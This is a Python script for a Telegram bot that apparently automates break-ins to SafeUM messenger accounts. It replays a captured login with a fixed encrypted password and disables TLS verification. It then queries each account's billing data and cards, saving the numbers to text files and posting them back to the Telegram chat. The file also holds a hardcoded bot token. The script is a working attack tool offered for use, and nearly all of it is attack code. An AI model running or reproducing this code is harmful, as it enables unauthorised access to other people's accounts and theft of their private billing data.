import json
import ssl
import gzip
import requests
import websocket
import threading
from telebot import TeleBot, types

# Initialize the Telegram bot with Telebot
bot_token = "6598206012:AAHmGat1fAWSNnvMxeary5btrCZ8dWPj7x4"
bot = TeleBot(bot_token)

print("my channels:- @KOK0KK")
blist = [
    {"action": "Profile", "subaction": "GetStatus", "id": "2078941366"},
    {"action": "Profile", "subaction": "GetAvatar", "id": "2078941367"},
    {"action": "Devices", "subaction": "SetPushUId", "pushuid": "*epGgiFFeSg2sxg2uzlqiMd:APA91bFNWtNdleljmYAf9sJPfE-EOWSuAnacf8OoUDgTGcBh9bu90JcVtVpjQyuD3ZVcFBmu3qw6LvaN2yqYpwnX_arO074j-TncaYSj1CFTMd_AQLfpp9OVzO1fI-BPBsh2Psey59WY", "id": "2078941368"},
    {"action": "Profile", "subaction": "GetAvatar", "id": "2078941369"},
    {"action": "Profile", "subaction": "GetStatusMessage", "id": "2078941370"},
    {"action": "Security", "subaction": "Get", "id": "2078941371"},
    {"action": "Profile", "subaction": "Get", "id": "2078941372"},
    {"action": "Profile", "subaction": "GetStatus", "id": "2078941373"},
    {"action": "Devices", "subaction": "Get", "id": "2078941374"},
    {"action": "Crypto", "subaction": "IsExists", "id": "2078941375"},
    {"action": "Devices", "subaction": "SoftwareMinMax", "os": "AND", "id": "2078941376"},
    {"action": "Security", "subaction": "GetBillingData", "id": "2078941377"},
    {"action": "Crypto", "subaction": "IsExists", "id": "2078941378"},
    {"action": "Security", "subaction": "GetCards", "id": "2078941379"}
]
numbers = """371211
371212
371213
371214
371218
371222""".split("\n")

server = ["193.200.173.45", "185.65.206.12", "195.13.182.217", "195.13.182.213", "180.210.203.183"]

def send_data(user, server_name, num, chat_id, message_id):
    url = f"wss://{server_name}:8080/Auth"
    headers = {
        "app": "com.safeum.android",
        "remoteIp": f"{server_name}",
        "remotePort": "8080",
        "sessionId": "b6cbb22d-06ca-41ff-8fda-c0ddeb148195",
        "time": "2024-07-07 12:12:12",
        "url": "wss://51.79.208.190/Auth"
    }

    data1 = {
        "action": "Login",
        "subaction": "GetKeyUnique",
        "deviceuid": "a64d8fdcc679de1f",
        "softwareversion": "1.1.0.2300",
        "id": "2078941362"
    }

    data2 = {
        "action": "Login",
        "subaction": "GetAuthData",
        "deviceuid": "a64d8fdcc679de1f",
        "softwareversion": "1.1.0.2300",
        "login": user,
        "id": "2078941363"
    }

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    try:
        ws = websocket.create_connection(url, header=headers, sslopt={"cert_reqs": ssl.CERT_NONE})
        
        ws.send(json.dumps(data1))
        ws.send(json.dumps(data2))
        response = ws.recv()
        print(gzip.decompress(response))
        data2 = json.loads(gzip.decompress(response))["key"]
        response = ws.recv()
        print(gzip.decompress(response))
        response = ws.recv()
        print(gzip.decompress(response))
        ws.send(json.dumps({
            "action": "Login",
            "subaction": "Login",
            "deviceuid": "a64d8fdcc679de1f",
            "softwareversion": "1.1.0.2300",
            "pub": data2,
            "locale": "en_US",
            "gmt": "+03",
            "password": {
                "m1x": "2077bbef25efe7518d487a570cb5cff8bacce03bb8418cc2a72c83f987e8e02d",
                "m1y": "4aee85ecae1ce39e52d690c662f341885dffa280417a62c3c26830d51a0441a0",
                "m2": "57223fab5ca6a91db7de1ecf173cee63c398017f8d73b8d43fa3981a325ea4f2",
                "iv": "b6b6ad34a53220f1b38e90a7fac885c7",
                "message": "4fdd6b0d4261b56507a814f8358599fa9bce770d209f243e0ab3aa1a411b69414f99388249d4a4e2b006bdc72c7f1afa8a53b98912cfe088b1894c0edfeb2e160f79e19ba8964eacb92f0875ad18a7a9"
            },
            "login": user,
            "devicename": "Xiaomi Redmi Note 9S",
            "os": "AND",
            "devicepushuid": "*epGgiFFeSg2sxg2uzlqiMd:APA91bFNWtNdleljmYAf9sJPfE-EOWSuAnacf8OoUDgTGcBh9bu90JcVtVpjQyuD3ZVcFBmu3qw6LvaN2yqYpwnX_arO074j-TncaYSj1CFTMd_AQLfpp9OVzO1fI-BPBsh2Psey59WY",
            "osversion": "and_12.0.0",
            "id": "2078941364"
        }))
        response = ws.recv()
        print(gzip.decompress(response))
        response = ws.recv()
        print(gzip.decompress(response))
        response = ws.recv()
        print(gzip.decompress(response))
        ws.send(json.dumps({
            "action": "Login",
            "subaction": "Alt",
            "deviceuid": "a64d8fdcc679de1f",
            "softwareversion": "1.1.0.2300",
            "login": user,
            "session": json.loads(gzip.decompress(response))["session"],
            "id": "2078941365"
        }))
        response = ws.recv()
        print(gzip.decompress(response))
        for a in blist:
            ws.send(json.dumps(a))

        for a in range(11):
            response = ws.recv()
            print(gzip.decompress(response))
            if "billingData" in json.loads(gzip.decompress(response)):
                number = str(json.loads(gzip.decompress(response))["billingData"]['inum'])
                if str(number[:6]) in numbers:
                    print(number)
                    with open("371.txt", "a") as f:
                        f.write(f"\n{user}  {number}")
                    bot.reply_to(message_id, f"❛ ━━━━･━━━━･━━━━ ❜\n<b>user:-</b> <code>{user}</code> \n<b>pass:-</b> <code>bhai</code> \n<b>number:-</b> <code>{number}</code>\n❛ ━━━━･━━━━･━━━━ ❜", parse_mode='HTML')
                    return 0
                with open("other.txt", "a") as f:
                    f.write(f"\n{user}  {number}")
                    bot.reply_to(message_id, f"❛ ━━━━･━━━━･━━━━ ❜\n<b>user:-</b> <code>{user}</code> \n<b>pass:-</b> <code>bhai</code> \n<b>number:-</b> <code>{number}</code> \n❛ ━━━━･━━━━･━━━━ ❜", parse_mode='HTML')
                    return 0
    except Exception as e:
        if num >= 10:
            return 0
        num += 1
        server_name = server[round(num / 2)-1]
        send_data(user, server_name, num, chat_id, message_id)

@bot.message_handler(commands=['start'])
def start(message): bot.send_photo(message.chat.id, 'https://t.me/THELIONCHETAVIP/3697', caption="Welcome! Please send me the user you want to process.", reply_to_message_id=message.message_id)

@bot.message_handler(func=lambda message: True)
def receive_user(message):
    user = message.text
    chat_id = message.chat.id
    message_id = message
    threading.Thread(target=send_data, args=(user, server[0], 1, chat_id, message_id)).start()

# Run the bot
bot.polling()
